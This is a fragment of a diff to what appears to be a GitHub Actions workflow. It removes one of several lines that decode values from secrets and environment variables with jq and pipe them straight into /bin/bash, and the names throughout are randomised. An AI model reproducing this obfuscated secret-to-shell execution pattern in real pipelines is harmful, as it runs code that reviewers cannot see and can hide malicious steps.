@@ -20,7 +20,6 @@ jobs:
           lotru757: ${{ secrets.lotru757 }}
         run: |
           printf '%s' "$lotru757" | jq -r .odwhw52687 | /bin/bash
-          echo $opep91 | jq -r .ayoz80579 | /bin/bash
           printf '%s' "$jpfl86200" | jq -r .rufh302 | /bin/bash
           echo $fehy44 | jq -r .qwp462 | /bin/bash
           echo $wxq042 | jq -r .lu5 | /bin/bash
